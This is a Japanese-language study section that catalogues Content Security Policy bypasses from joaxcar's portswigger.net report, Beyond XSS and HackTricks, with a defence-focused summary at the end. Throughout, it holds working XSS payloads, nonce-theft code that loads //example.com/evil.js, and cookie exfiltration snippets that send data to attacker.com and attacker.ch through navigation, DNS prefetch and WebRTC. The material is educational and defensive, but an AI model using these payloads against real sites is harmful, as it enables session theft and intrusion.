## CSPバイパス総まとめ（joaxcar / Beyond XSS / HackTricks）

CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、そもそも突破しなくても情報が漏れてしまうケースがあるという事実である。本節では、実際のバグバウンティ報告（joaxcar による portswigger.net のバイパス）、体系的な解説教材（Beyond XSS）、実務リファレンス（HackTricks）という3つの視点から、CSPバイパスのカタログを整理する。

隣接する節との棲み分けを先に述べておく。CSPが構造的になぜ破れやすいのかという理論（Googleの "CSP Is Dead" 論文と `strict-dynamic`）は **s4i**、スクリプトガジェット／コード再利用による「CSP違反ゼロでの任意コード実行」の実例（Truesec・PortSwigger nonce）は **s4l** で扱った。本節はそれらを踏まえたうえで、実戦で使う**バイパス手法そのものの網羅的カタログ**を提供する。

### 前提：CSPの照合ロジックを一段深く理解する

CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action`, `connect-src` などの**ディレクティブ**ごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトを実行しようとするたびに、その取得元URLやインラインかどうかを対応ディレクティブの**ソースリスト**と照合し、一致しなければブロックする。

ソースリストで使われる主なキーワードの意味は次の通り。バイパスはこの一つ一つの「解釈の隙間」を突くので、正確に押さえておく。

| キーワード | 意味 | 注意点（＝攻撃の入口になりやすい理由） |
|---|---|---|
| `'self'` | 同一オリジンのリソースのみ許可 | サイト内にファイルアップロードやJSONPがあると自爆する |
| `'unsafe-inline'` | インライン `<script>`・イベントハンドラを許可 | これがあると事実上XSS防御は無い |
| `'unsafe-eval'` | `eval()` / `Function()` 等を許可 | ライブラリのテンプレート評価が着火点になる |
| `'nonce-xxxx'` | 指定した乱数トークンを持つインラインスクリプトのみ許可 | `strict-dynamic` が無いとホワイトリスト頼みに戻る |
| `'strict-dynamic'` | nonce/hashで信頼されたスクリプトが動的に読み込む子スクリプトも信頼する。**ホスト名ホワイトリストを無効化する** | 正しく使えば強力だが、旧ブラウザ用フォールバックが緩いと台無し |
| `'unsafe-hashes'` | 特定のインラインイベントハンドラをハッシュで許可 | ガジェット経由の悪用余地 |
| `data:` | `data:` URIからの読み込みを許可 | `data:text/javascript,...` を直接注入できる |
| `blob:` | `blob:` URLを許可 | JSで生成したBlobを実行できる |
| `*` | data:/blob:/filesystem: 以外の全URLを許可 | 実質ホワイトリスト無効化 |

**CSPバイパスとは、この照合ロジックの「抜け（設定漏れ）」や「解釈のズレ（パーサ差異・リダイレクト）」を突いて、ポリシーが本来許可しないはずの挙動を実行させる技術群**である。重要な洞察は、バイパスの多くが「攻撃コードの巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクト）が存在する」という運用上の見落としを突くという点にある。

---

### 資料1：joaxcar — Googleスクリプトリソースによる portswigger.net のCSPバイパス（2024年）

Johan Carlsson（joaxcar）は2024年2月、CSPで守られた **portswigger.net 本体**（PortSwigger社の公式サイト）で、nonceベースのCSPを完全にバイパスして任意スクリプト実行に至った事例を報告した。これは「nonceがあってもホワイトリスト依存だと破れる」という s4i/s4l の理論を、標的が防御側のプロ企業自身であるという象徴的な形で実証したケースである。

#### 弱点の構図：nonce + ホワイトリスト、ただし `strict-dynamic` なし

portswigger.net のCSPは、インラインスクリプトを `nonce` で制御しつつ、reCAPTCHA のために Google のスクリプトリソース（`https://www.google.com/recaptcha` と `https://www.gstatic.com/recaptcha`）をホスト名で**ホワイトリスト**していた。ここに `'strict-dynamic'` が付いていなかったことが致命的だった。`strict-dynamic` が無いnonce CSPでは、**ホワイトリストされたホストのURLはnonceが無くても読み込めてしまう**。つまりnonceで固めたつもりでも、実質は「Googleのリソースなら何でも許可」の状態に戻っていた。

そしてGoogleが reCAPTCHA と一緒に配信していたバンドルの中には、**AngularJS が含まれていた**。AngularJSは「CSPの定番ブレーカー（classic CSP breaker）」と呼ばれ、ページに読み込ませるだけで、Angularのテンプレート式評価を通じてサンドボックス外のJSを実行できてしまうことで知られる。

#### ステップ1：Angularガジェットで最初のJS実行を得る

まず、ホワイトリストされたGoogleドメインからAngularJS入りのスクリプトを読み込み、Angularのディレクティブ（`ng-on-error` などのイベント式）を使って初弾のコード実行を起こす。

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

**なぜ動くか**：`<script src=...>` はホワイトリスト済みホストなのでCSPを通る。読み込まれたバンドルにAngularJSが含まれるため、ページ内のAngularディレクティブ（`ng-on-error`）が有効化される。`<img src=x>` は読み込みに失敗して `error` イベントを発火し、その式 `$event.target.ownerDocument.defaultView.alert(1)` がAngularの式エバリュエータで評価される。式はインラインスクリプトではなく「属性値の中の文字列」なので、`script-src 'nonce-...'` のインライン判定に引っかからない。これがAngularをCSPブレーカーたらしめる核心である。

#### ステップ2：nonceを盗み出す

Angular式の中からは通常のDOM APIが使える。CSPのnonceはDevToolsのAttributes表示では隠されるものの、**JavaScriptからは `element.nonce` プロパティで読み取れる**（DOM上の `[nonce]` セレクタでも要素は選択できる）。

```javascript
const nonce = document.querySelector("[nonce]").nonce;
```

**なぜ動くか**：ブラウザはnonce値をHTML属性としては露出しない（属性ゲッターでは空になる）が、IDLプロパティ `HTMLScriptElement.nonce` としてはスクリプトから参照可能なまま残す。この「属性は隠すがプロパティは残す」という設計上の非対称が、同一オリジンで既に走っているスクリプト（ここではAngular経由の攻撃者コード）にとっては抜け穴になる。

#### ステップ3：盗んだnonceで任意スクリプトを注入して昇格

nonceさえ手に入れば、正規のインラインスクリプトになりすまして外部スクリプトを注入できる。`unsafe-eval` が無くても関係ない。

```html
<img src=x ng-on-error='doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```

**なぜ動くか**：新しく作った `<script>` 要素に正規の `nonce` を設定して `body` に追加すると、ブラウザはそのスクリプトを「nonce一致＝許可済み」と判定して実行する。これでホワイトリスト外の任意オリジン（`//example.com/evil.js`）から任意コードを実行でき、部分的なXSSが完全なXSSへ昇格する。

#### 影響・報奨・修正

完全なCSPバイパスにより、限定的なHTMLインジェクションから任意コード実行へ到達した。PortSwiggerはこのCSPバイパスを受理（$1,000）、さらに欠けていた `form-action` ディレクティブも指摘され（$500）、両方を修正した。教訓は明快で、**nonceベースCSPには `'strict-dynamic'` を必ず併用し、ホスト名ホワイトリスト（とりわけAngularJSやJSONPを配りうるGoogle系ドメイン）に依存しない**こと。

> 出典: CSP bypass on portswigger.net using Google script resources — https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/

---

### 資料2：Beyond XSS — CSPバイパスの体系

Huli（@aszx87410）の教材 Beyond XSS のCSP章は、「XSSに対する第二の防衛線」としてのCSPを、`script-src` のソース許可評価という視点から系統立てて解体する。実務でよく効く6つのパターンを、原典のペイロードで示す。

#### (1) 許可ドメインが広すぎる（CDNまるごと許可）

`script-src https://unpkg.com/` のようにCDNのオリジンをまるごと許可すると、そのCDN上に置かれた**悪意あるライブラリ**を読み込めてしまう。

```html
<script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp="alert(1)">
```

**なぜ動くか**：`unpkg.com` はnpmの任意パッケージをそのまま配信する。攻撃者が公開した `csp-bypass` パッケージは、独自属性 `csp="..."` の中身をJS式として評価するミニインタプリタ（`sval`）を含む。CSPは「unpkg.com由来のスクリプト」を許可しているだけなので、その中身が攻撃者製でも通る。**防御**は「パスまで完全指定する」こと。`https://unpkg.com/` ではなく `https://unpkg.com/react@16.7.0/` のようにバージョン付きの厳密なパスを書く。

#### (2) `base-uri` 未指定 → `<base>` タグによる相対パス乗っ取り

nonceで守っていても、`base-uri` を指定していないと `<base>` タグで相対URLの基準を攻撃者サーバに向けられる。

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'nonce-abc123';">
<base href="https://attacker.com/">
<script nonce=abc123 src="app.js"></script>
```

**なぜ動くか**：`<script src="app.js">` は相対URLなので、解決の基準が `<base href>` に従う。攻撃者が `<base href="https://attacker.com/">` を注入できれば、`app.js` は `https://attacker.com/app.js` から読み込まれる。nonceは一致しているのでCSPは通ってしまう。**防御**は `base-uri 'none'`（または `'self'`）を必ず入れること。

#### (3) 許可ドメイン上のJSONPエンドポイント

ホワイトリストされたドメインに、コールバック名を検証しないJSONPエンドポイントがあると、そのコールバック引数に任意コードを注入できる。

```html
<meta http-equiv="Content-Security-Policy"
  content="script-src https://www.google.com https://www.gstatic.com">
<script src="https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//"></script>
```

サーバは次のようなレスポンスを返す。

```javascript
alert(1);//([{id: 1, name: 'user01'}])
```

**なぜ動くか**：JSONP（JSON with Padding）は「JSONを指定コールバック関数の引数に包んで返す」仕組み。コールバック名 `jsonp=alert(1)//` がそのままレスポンス冒頭に出力され、末尾の `//` で残りのJSONをコメントアウトするため、`alert(1);` という有効なJSが `www.google.com` オリジンから配信される＝CSP的には完全に正規。**防御**はパスを絞る（`https://www.google.com/recaptcha/` など）とともに、許可ドメインをJSONBeeのようなリストで監査し、既知のJSONP穴が無いか確認すること。

#### (4) コールバックが制限されたJSONP → SOME（Same-Origin Method Execution）

コールバック名が英数字とドットに制限されている場合でも、既存のページ機能を鎖状に呼び出す **SOME攻撃** に持ち込める。

```javascript
?callback=document.body.firstElementChild.nextElementSibling.click
```

**なぜ動くか**：任意JSが書けなくても、`a.b.c.method` 形式のメソッド参照は英数字とドットだけで表現できる。JSONPがそれを関数として呼ぶと、ページ上の要素（例：管理操作ボタン）の `click()` などが攻撃者の意図で発火する。WordPressプラグインのインストール攻撃事例として知られる。

#### (5) サーバサイドリダイレクトによるパス制限のすり抜け

CSPの**パス指定はリダイレクト後には再チェックされない**という仕様を突く。

```html
<meta http-equiv="Content-Security-Policy"
  content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
<script src="http://localhost:5555/301"></script>
```

`http://localhost:5555/301` が `https://www.google.com/complete/search?jsonp=alert(1)` へ301リダイレクトすると、CSPは最終URLのパスを検証しないため、JSONP穴のあるパスへ到達できる。**なぜ動くか**：CSPのリダイレクト時のマッチングは「オリジンは見るがパスは見ない」仕様（情報漏洩防止のため、リダイレクト先パスを攻撃者に観測させない設計の副作用）。**防御**はサイトにオープンリダイレクトを残さないこと。

#### (6) 相対パス上書き（RPO）：`%2f` のデコード差

パス制限を、URLエンコードされたスラッシュのデコード差で回避する。

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

**なぜ動くか**：ブラウザは `%2f` を「エンコードされた文字」として扱い、パスは表面上 `scripts/react/` 配下に見えるためCSPを通す。ところがサーバ側が `%2f` を `/` にデコードすると、実際には `scripts/react/../angular/angular.js`＝親ディレクトリの `angular/angular.js` が読み込まれる。**防御**はサーバで `%2f` を `/` として正規化しない（デコードしてからのパス解決をしない）こと。

#### (7) 厳格なCSPでも残る情報の持ち出し

`default-src 'none'` でも、以下の経路でデータは外へ出せる（＝CSPはXSSの実行は止めても、情報漏洩の全経路は塞げない）。

- **ナビゲーション**：`window.location = 'https://example.com?q=' + document.cookie`
- **WebRTC**：ICEサーバ設定を通じてSTUN/TURN経由でデータを漏らす
- **DNSプリフェッチ**：`<link rel="dns-prefetch" href="https://<秘密>.example.com">` でサブドメインにデータを載せてDNS問い合わせとして送る

将来的な `navigate-to` / `webrtc` ディレクティブが一部を塞ぐ可能性はあるが、現状はCSP単独では防ぎきれない。Beyond XSS は「完全に問題のないCSPを書くのは難しく、時間をかけて段階的にunsafeな要素を消していく」という漸進的ハードニングを推奨している。

> 出典: Beyond XSS — CSP bypass — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

---

### 資料3：HackTricks — CSPバイパス総覧（実務チートシート）

HackTricks のCSPバイパス項は、ペンテスト現場で「与えられたポリシー文字列を見て、どの穴から入るか」を素早く判断するためのカタログである。上の2資料と重なる部分は要点のみとし、追加で重要なものを挙げる。

#### インライン許可・ワイルドカード・スキーム

`'unsafe-inline'` があれば古典的にそのまま通る。

```html
"/><script>alert(1);</script>
```

ワイルドカードや広いスキーム（`script-src 'self' https://google.com https: data *;`）があれば、任意オリジンや `data:` から読み込める。

```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

#### JSONPエンドポイント一覧（許可ドメイン別）

`'self'` に加えてこれらの著名ドメインが許可されていると、既知のJSONP穴でバイパスできる。JSONBee がこうしたエンドポイントをまとめている。

```
https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1
https://accounts.google.com/o/oauth2/revoke?callback=eval(...)
https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert
https://www.youtube.com/oembed?callback=alert
```

`ajax.googleapis.com` が許可されていれば、AngularJSを読み込んでガジェット化する定番も使える。

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
```

#### ファイルアップロード + `'self'`

`script-src 'self'` のサイトに、JSとして解釈されるファイルをアップロードできれば自爆する。

```html
"/>'><script src="/uploads/picture.png.js"></script>
```

拡張子偽装（`.png.js`）やポリグロット、サーバのMIME判定次第で成立する。**同一オリジンにアップロード機能があるなら `'self'` は危険**という教訓。

#### ディレクティブ欠落の悪用

`object-src` も `default-src` も無ければ、`<object>` で `data:` HTMLを実行できる。

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

`base-uri` 欠落は前述の `<base>` 乗っ取りにつながる。

#### ポリシー・インジェクション

アプリがCSP文字列に攻撃者入力を反映してしまう場合、ポリシー自体を書き換える。
- **Chrome**：`script-src-elem *` を注入して制限を上書き（後発ディレクティブが優先される挙動を悪用）。
- **Edge**：`;_` を注入してポリシー全体を壊す（無効化）。

#### 外部通信ゼロでの情報持ち出し

`connect-src` すら無い環境でのデータ漏洩の実物。

```javascript
// DNSプリフェッチにcookieを載せる
var sessionid = document.cookie.split("=")[1];
var body = document.getElementsByTagName("body")[0];
body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.ch">'
```

```javascript
// WebRTCのDNS問い合わせで漏らす
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] });
p.createDataChannel("");
p.setLocalDescription(await p.createOffer())
```

```javascript
// 素朴なナビゲーション
document.location = "https://attacker.com/?" + document.cookie
```

#### PHP実装依存のバイパス

CSPヘッダを `header()` で送る前に出力が始まってしまうとヘッダが付かない、という実装の隙を突く。
- **max_input_vars 超過**：大量のPOST変数を送るとwarningが `header()` 前に出力され、「headers already sent」でCSPヘッダの送出に失敗する。
- **レスポンスバッファ飽和**：4096バイト超のwarning等でバッファを溢れさせ、CSP付与前に本文送信を始めさせる。

#### `form-action` 欠落による資格情報窃取

`form-action` が無いと、反映HTMLに偽ログインフォームを注入できる。ブラウザのパスワードマネージャが自動入力し、既定の `GET` 送信で資格情報がURLに載り、`<meta http-equiv="Refresh">` でクロスオリジンへ飛ばしてReferer経由で漏らす。joaxcarの事例で `form-action` 欠落が別途指摘されたのはこの文脈である。

#### ブックマークレット

CSPは「ページ内で読み込むリソース」を制御するが、ユーザがドラッグ＆ドロップした**ブックマークレット**はページのCSPの外で実行される。ソーシャルエンジニアリングと組み合わせる古典。

#### 分析ツール

- **CSP Evaluator**（Google）: https://csp-evaluator.withgoogle.com/ — ポリシーの弱点を機械診断
- **CSP Validator**: https://cspvalidator.org/
- **csper.io** — 観測リソースから候補ポリシーを生成

> 出典: HackTricks — Content Security Policy (CSP) Bypass — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html

---

### 横断まとめ：バイパスを4つの型に分類する

3資料を貫く共通構造を、防御設計に使える形で分類しておく。

1. **許可リストの過剰（設定漏れ型）**：CDNまるごと・`*`・`data:`・`unsafe-inline`/`unsafe-eval`。→ パスまで厳密指定、`'strict-dynamic'` + nonce に移行し、ホスト名ホワイトリストへの依存を捨てる。
2. **信頼済みドメイン内のガジェット（ホワイトリスト裏切り型）**：JSONP、AngularJS、既存ライブラリのテンプレート評価。→ 許可ドメインをCSP Evaluator / JSONBee で監査。Google系（`www.google.com`, `ajax.googleapis.com`, `accounts.google.com`）は特に危険。
3. **パーサ・仕様の解釈差（デコード/リダイレクト型）**：`%2f` のRPO、リダイレクトでのパス無視、`<base>` 乗っ取り、ポリシー・インジェクション。→ `base-uri 'none'`、オープンリダイレクト排除、`%2f` を正規化しない、CSP文字列に入力を反映しない。
4. **実行は防いでも漏洩は防げない（範囲外型）**：`location`、WebRTC、DNSプリフェッチ、`form-action` 欠落による資格情報窃取。→ `connect-src`/`form-action`/`navigate-to` を明示し、CSPを「XSS実行の防止」に限定した防御と割り切って多層で守る。

最重要の実務結論は、`strict-dynamic` を伴うnonceベースCSP（strict CSP、s4i参照）への移行である。ホスト名ホワイトリスト方式は上記1〜3のほぼ全てに晒されるが、strict CSPはホワイトリスト自体を無効化するため、JSONP・AngularJS・RPO・リダイレクトといった「信頼済みドメイン悪用」系のバイパスをまとめて封じられる。joaxcarのportswigger.net事例は、まさに `strict-dynamic` の欠落が全ての引き金だったことを示している。
